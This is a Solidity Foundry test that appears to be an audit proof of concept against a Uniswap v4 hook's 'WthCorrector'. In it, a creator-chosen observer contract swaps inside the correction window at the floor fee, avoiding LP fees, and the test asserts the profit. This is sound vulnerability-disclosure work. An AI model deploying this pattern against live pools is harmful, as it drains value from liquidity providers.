// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

import {ExtensionCampaignBase} from "frontier-test/ExtensionCampaignBase.sol";
import {MockBCToken} from "frontier-test/ProtocolMocks.sol";
import {IFactoryHook} from "frontier/interfaces/IFactoryHook.sol";
import {IWETH} from "frontier/interfaces/IWETH.sol";
import {HookPayload} from "kit/HookPayload.sol";

import {IWthCorrector} from "contracts/wth-corrector/IWthCorrector.sol";
import {WthCorrector} from "contracts/wth-corrector/WthCorrector.sol";
import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";
import {Vm} from "forge-std/Vm.sol";

/// creator-chosen observer that swaps inside the corrector window during the executor's nested leg
contract WindowSniper {
    using StateLibrary for IPoolManager;

    event Sniped(uint256 coinSold, uint256 ethGot, uint256 fgBefore, uint256 fgAfter);

    IPoolManager public immutable pm;
    IWthCorrector public immutable corrector;
    PoolKey public key;
    uint256 public coinIn;

    constructor(IPoolManager _pm, IWthCorrector _c) { pm = _pm; corrector = _c; }
    receive() external payable {}
    function setKey(PoolKey memory k, uint256 amt) external { key = k; coinIn = amt; }
    function onRegisterObserver(PoolId, bytes calldata) external {}
    function onFeeChange(PoolId, uint24, uint24) external {}

    function onAfterSwap(PoolId poolId, BalanceDelta, uint24, uint256, bytes calldata) external {
        uint256 busy;
        assembly { busy := tload(0) }
        if (busy != 0) return;
        (, uint160 upper) = corrector.currentBand(poolId);
        if (upper == 0) return; // window closed: a normal user swap
        assembly { tstore(0, 1) }
        PoolKey memory k = key;
        (, uint256 fgBefore) = pm.getFeeGrowthGlobals(poolId);
        BalanceDelta d = pm.swap(k, SwapParams({zeroForOne: false, amountSpecified: -int256(coinIn), sqrtPriceLimitX96: upper - 1}), "");
        (, uint256 fgAfter) = pm.getFeeGrowthGlobals(poolId);
        uint256 coinSold = uint256(uint128(-d.amount1()));
        uint256 ethGot = uint256(uint128(d.amount0()));
        pm.sync(k.currency1);
        IERC20(Currency.unwrap(k.currency1)).transfer(address(pm), coinSold);
        pm.settle();
        pm.take(k.currency0, address(this), ethGot);
        emit Sniped(coinSold, ethGot, fgBefore, fgAfter);
        assembly { tstore(0, 0) }
    }
}

/// lean partner executor: one small in-band sell leg, pays the minimum in native ETH
contract LeanExecutor {
    IPoolManager public immutable pm;
    address public immutable corrector;
    uint256 public sellAmount;
    constructor(IPoolManager _pm, address _c) { pm = _pm; corrector = _c; }
    receive() external payable {}
    function setSell(uint256 a) external { sellAmount = a; }
    function executeArbitrage(PoolKey calldata key, address, IWthArbitrageExecutor.ProfitSplit calldata) external returns (uint256) {
        PoolId id = PoolIdLibrary.toId(key);
        (, uint160 upper) = IWthCorrector(corrector).currentBand(id);
        BalanceDelta d = pm.swap(key, SwapParams({zeroForOne: false, amountSpecified: -int256(sellAmount), sqrtPriceLimitX96: upper - 1}), "");
        pm.sync(key.currency1);
        IERC20(Currency.unwrap(key.currency1)).transfer(address(pm), uint256(uint128(-d.amount1())));
        pm.settle();
        pm.take(key.currency0, address(this), uint256(uint128(d.amount0())));
        (bool ok,) = corrector.call{value: 1e12}("");
        require(ok);
        return 0;
    }
}

contract WindowObserverPoC is ExtensionCampaignBase {
    using HookPayload for IFactoryHook.HookConfigV2;
    using StateLibrary for IPoolManager;

    uint16 internal constant LP_BPS = 3000;

    function test_creatorObserver_tradesInTheWindowAtTheFloor() public {
        WthCorrector corrector = new WthCorrector(address(factory), poolManager, address(weth), 250_000, 1e12);
        WindowSniper sniper = new WindowSniper(poolManager, IWthCorrector(address(corrector)));
        (MockBCToken wCoin, PoolId pid) = _deployGraduated(
            HookPayload.withFee(3000).addCalculator(address(corrector), abi.encode(TICK_SPACING, LP_BPS))
                .addObserver(address(sniper), HookPayload.CALL_AFTER_SWAP, "")
                .addObserver(address(corrector), HookPayload.CALL_AFTER_SWAP, abi.encode(TICK_SPACING, LP_BPS)),
            false
        );
        PoolKey memory key = _poolKey(address(wCoin));
        LeanExecutor executor = new LeanExecutor(poolManager, address(corrector));
        vm.prank(users.owner);
        corrector.setExecutor(address(executor));
        vm.deal(address(executor), 1 ether);
        uint256 held = wCoin.balanceOf(users.buyerOne);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(executor), held / 4);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(sniper), held / 4);
        executor.setSell(1e15);
        sniper.setKey(key, wCoin.balanceOf(address(sniper)));

        uint256 ethBefore = address(sniper).balance;
        vm.recordLogs();
        uint256 got = _swapEthForCoin(address(wCoin), users.buyerTwo, 0.3 ether);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool settled;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(corrector) && logs[i].topics[0] == IWthCorrector.CorrectionSettled.selector) settled = true;
            if (logs[i].emitter == address(sniper)) {
                (uint256 cs, uint256 eg, uint256 f0, uint256 f1) = abi.decode(logs[i].data, (uint256, uint256, uint256, uint256));
                emit log_named_uint("sniper coin sold", cs);
                emit log_named_uint("sniper eth got", eg);
                emit log_named_uint("fg1 before", f0);
                emit log_named_uint("fg1 after", f1);
                assertEq(f1, f0, "no LP fee growth on the sniper leg");
            }
        }
        emit log_named_uint("user coin out", got);
        emit log_named_uint("sniper eth gain", address(sniper).balance - ethBefore);
        assertTrue(settled, "correction settled, sniper leg kept");
        assertGt(address(sniper).balance, ethBefore, "sniper sold coin at the floor fee");
    }
}
